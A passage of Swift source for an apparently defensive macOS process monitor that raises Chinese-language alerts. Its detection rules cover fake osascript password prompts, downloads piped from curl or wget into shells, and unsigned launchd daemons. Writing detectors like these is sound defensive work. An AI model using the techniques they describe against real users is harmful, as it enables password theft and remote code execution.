            let p = Proc(pid: pid, ppid: ppid, pgid: pid_t(info.pbsi_pgid), uid: uid, path: String(cString: buffer))
            let alert = examine(p, me: me)
            current[pid] = (ppid, uid, p, alert)
            procs.append(p)
            if let alert { alerts.append(alert) }
        }
        seen = current
        // osascript dialogs are re-read every pass: the arguments are what matter.
        for p in procs where p.name == "osascript" && p.uid == me {
            if let args = Self.arguments(of: p.pid)?.joined(separator: " "), args.lowercased().contains("hidden answer") {
                var a = processAlert(p, .critical, "有程序弹窗索要密码", "osascript 的隐藏输入框，木马常用来骗登录密码。别输入！\n" + String(args.prefix(200)))
                a.id = "phish|\(p.pid)|\(Self.digest(Data(args.utf8)))"
                a.event = true
                alerts.append(a)
            }
        }


        // `curl … | zsh`: the downloader's stdout is the same pipe as an interpreter's stdin.
        let byGroup = Dictionary(grouping: procs.filter { $0.uid == me }, by: \.pgid)
        for p in procs where p.uid == me && (p.name == "curl" || p.name == "wget") {
            guard let out = Self.pipe(of: p.pid, fd: 1) else { continue }
            for q in byGroup[p.pgid] ?? [] where q.pid != p.pid {
                let qn = q.name
                guard Self.interpreters.contains(qn) || qn.hasPrefix("python") || qn == "base64",
                      let inp = Self.pipe(of: q.pid, fd: 0),
                      inp.handle == out.peer || inp.peer == out.handle || inp.handle == out.handle else { continue }
                let args = Self.arguments(of: p.pid) ?? []
                let commandLine = args.joined(separator: " ") + " | " + qn
                let risk = Self.commandRisk(commandLine)
                guard qn == "base64" || risk != nil else { continue }
                let url = args.first { $0.contains("://") } ?? "—"
                var a = processAlert(p, .critical, "正在把下载内容直接交给 \(qn) 执行",
                                     (risk?.reason ?? "下载后先 base64 解码") + "\n网址：\(url)")
                a.id = "pipe|\(Self.digest(Data(commandLine.utf8)))"
                a.event = true
                alerts.append(a)
            }
        }
        return (alerts, procs.count)
    }

    /// Rules that depend only on who runs what, so they are evaluated once per process.
    private func examine(_ p: Proc, me: uid_t) -> SecurityAlert? {
        // Root daemon running something out of a user folder: exactly how the 2026 infection persisted.
        if p.uid == 0, p.path.hasPrefix("/Users/") {
            return processAlert(p, .critical, "root 进程在运行用户目录里的程序", p.ppid == 1 ? "由 launchd 常驻启动" : "父进程 \(p.ppid)")
        }
        if p.ppid == 1, let place = Self.riskyPlace(p.path) {
            let s = signer(for: p.path)
            if !s.trusted { return processAlert(p, .critical, "后台常驻程序\(place)", "签名：\(s.text)") }
        }
        if p.ppid == 1, p.path.hasPrefix("/Users/") || p.path.hasPrefix("/tmp") || p.path.hasPrefix("/private/") {
            let s = signer(for: p.path)
            if s == .unsigned || s == .adhoc {
                return processAlert(p, .warning, "新的未签名后台程序 \(p.name)", "签名：\(s.text)，由 launchd 常驻")
            }
        }
        return nil
    }

    private func processAlert(_ p: Proc, _ severity: Severity, _ title: String, _ why: String) -> SecurityAlert {
        SecurityAlert(id: "proc|\(p.path)", kind: .process, severity: severity, title: title,
                      detail: "\(why)\nPID \(p.pid) · \(p.uid == 0 ? "root" : "用户 \(p.uid)")",
                      executable: p.path, pid: p.pid, uid: p.uid)
    }

    static func pipe(of pid: pid_t, fd: Int32) -> (handle: UInt64, peer: UInt64)? {
        var info = pipe_fdinfo()
        let size = Int32(MemoryLayout<pipe_fdinfo>.size)
        guard proc_pidfdinfo(pid, fd, PROC_PIDFDPIPEINFO, &info, size) == size else { return nil }
        return (info.pipeinfo.pipe_handle, info.pipeinfo.pipe_peerhandle)
    }

    /// argv of one of our own processes (KERN_PROCARGS2: argc, exec path, padding, then the arguments).
    static func arguments(of pid: pid_t) -> [String]? {
        var mib: [Int32] = [CTL_KERN, KERN_PROCARGS2, pid]
        var size = 0
        guard sysctl(&mib, 3, nil, &size, nil, 0) == 0, size > 4 else { return nil }
        var buffer = [UInt8](repeating: 0, count: size)
        guard sysctl(&mib, 3, &buffer, &size, nil, 0) == 0 else { return nil }
        let argc = buffer.withUnsafeBytes { $0.load(as: Int32.self) }
        var i = 4
        while i < size, buffer[i] != 0 { i += 1 } // exec path
        while i < size, buffer[i] == 0 { i += 1 } // padding
        var args: [String] = []
        while args.count < argc, i < size {
            let start = i
            while i < size, buffer[i] != 0 { i += 1 }
            args.append(String(decoding: buffer[start..<i], as: UTF8.self))
            i += 1
        }
        return args
    }

    // MARK: Code signatures

    func signer(for path: String) -> Signer {
        let stamp = (try? FileManager.default.attributesOfItem(atPath: path)[.modificationDate]) as? Date
        if let cached = signatures[path], cached.stamp == stamp { return cached.signer }
        let result = Self.evaluate(path)
        signatures[path] = (stamp, result)
        return result
    }

    private static func evaluate(_ path: String) -> Signer {
        guard FileManager.default.fileExists(atPath: path) else { return .missing }
        if let handle = FileHandle(forReadingAtPath: path) {
            let head = handle.readData(ofLength: 2)
            try? handle.close()
            if head == Data("#!".utf8) { return .script }
        }
        var code: SecStaticCode?
        guard SecStaticCodeCreateWithPath(URL(fileURLWithPath: path) as CFURL, [], &code) == errSecSuccess, let code else {
            return .unsigned
        }
        var requirement: SecRequirement?
        SecRequirementCreateWithString("anchor apple" as CFString, [], &requirement)
        let flags = SecCSFlags(rawValue: kSecCSDoNotValidateResources)
        if SecStaticCodeCheckValidity(code, flags, requirement) == errSecSuccess { return .apple }
        let status = SecStaticCodeCheckValidity(code, flags, nil)
        if status == errSecCSUnsigned { return .unsigned }
        var info: CFDictionary?
        SecCodeCopySigningInformation(code, SecCSFlags(rawValue: kSecCSSigningInformation), &info)
        let dict = info as? [String: Any] ?? [:]
        let codeFlags = (dict[kSecCodeInfoFlags as String] as? UInt32) ?? 0
        if codeFlags & 0x2 != 0 { return .adhoc } // kSecCodeSignatureAdhoc
        guard status == errSecSuccess else { return .unsigned }
        if let certs = dict[kSecCodeInfoCertificates as String] as? [SecCertificate], let leaf = certs.first,
           let summary = SecCertificateCopySubjectSummary(leaf) as String? {
            var name = summary
            for prefix in ["Developer ID Application: ", "Apple Development: ", "Apple Distribution: ", "Mac Developer: "]
            where name.hasPrefix(prefix) { name = String(name.dropFirst(prefix.count)) }
            if let paren = name.range(of: " (", options: .backwards) { name = String(name[..<paren.lowerBound]) }
            return .developer(name)
        }
        if let team = dict[kSecCodeInfoTeamIdentifier as String] as? String { return .developer(team) }
        return .adhoc
    }

    // MARK: System posture

    static func posture() -> Posture {
        Posture(
            sip: run("/usr/bin/csrutil", ["status"]).lowercased().contains("enabled"),
            gatekeeper: run("/usr/sbin/spctl", ["--status"]).contains("enabled"),
            fileVault: run("/usr/bin/fdesetup", ["status"]).contains("On"),
            firewall: run("/usr/libexec/ApplicationFirewall/socketfilterfw", ["--getglobalstate"]).lowercased().contains("enabled")
        )
    }

    static func run(_ path: String, _ args: [String]) -> String {
        let task = Process()
        task.executableURL = URL(fileURLWithPath: path)
        task.arguments = args
        let out = Pipe()
        task.standardOutput = out
        task.standardError = out
        do { try task.run() } catch { return "" }
        let data = out.fileHandleForReading.readDataToEndOfFile()
        task.waitUntilExit()
        return String(decoding: data, as: UTF8.self)
    }

    static func digest(_ data: Data) -> String {
        SHA256.hash(data: data).prefix(8).map { String(format: "%02x", $0) }.joined()
    }
}
